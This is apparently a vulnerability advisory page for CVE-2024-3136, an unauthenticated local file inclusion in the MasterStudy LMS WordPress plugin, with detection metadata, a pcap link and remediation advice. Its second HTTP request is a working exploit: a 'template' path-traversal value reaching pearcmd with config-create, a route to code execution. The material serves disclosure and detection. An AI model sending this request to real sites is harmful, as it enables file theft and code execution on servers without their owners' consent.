---
layout: post
cve_id: CVE-2024-3136
title: MasterStudy LMS <= 3.3.3 - Unauthenticated Local File Inclusion via template
pcap: true
pcap_path: /pcaps/2024/CVE-2024-3136.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-3136.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'An attacker can read sensitive files, execute arbitrary code, or escalate
  privileges.

  '
remediation: 'Upgrade MasterStudy LMS to version 3.3.4 or higher to mitigate the vulnerability.

  '
reference:
- https://plugins.trac.wordpress.org/changeset/3064337/masterstudy-lms-learning-management-system/trunk/_core/lms/classes/helpers.php
- https://plugins.trac.wordpress.org/changeset/3064337/masterstudy-lms-learning-management-system/trunk/_core/lms/classes/templates.php
- https://www.wordfence.com/threat-intel/vulnerabilities/id/9a573740-cdfe-4b58-b33b-5e50bcbc4779?source=cve
- https://github.com/drdry2/CVE-2024-3136-Wordpress-RCE
- https://github.com/nomi-sec/PoC-in-GitHub
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-3136
  epss-score: 0.45313
  epss-percentile: 0.97486
  cpe: cpe:2.3:a:stylemixthemes:masterstudy_lms:*:*:*:*:wordpress:*:*:*
metadata:
  verified: true
  max-request: 2
  publicwww-query: /wp-content/plugins/masterstudy-lms-learning-management-system
  product: masterstudy_lms
  vendor: stylemixthemes
tags:
- cve
- cve2024
- wp
- wordpress
- unauth
- lfi
- vuln
---

## ðŸ” Vulnerability Description
The MasterStudy LMS plugin for WordPress is vulnerable to Local File Inclusion in all versions up to, and including, 3.3.3 via the 'template' parameter. This makes it possible for unauthenticated attackers to include and execute arbitrary files on the server, allowing the execution of any PHP code in those files. This can be used to bypass access controls, obtain sensitive data, or achieve code execution in cases where  images and other "safe" file types can be uploaded and included.

## ðŸŒ HTTP Request
```nohighlight
GET /?p=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php?template=../../../../../../../../usr/local/lib/php/pearcmd&+config-create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.3
Connection: close
Content-Length: 41
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=stm_lms_load_content&nonce=MyxGqm&
```

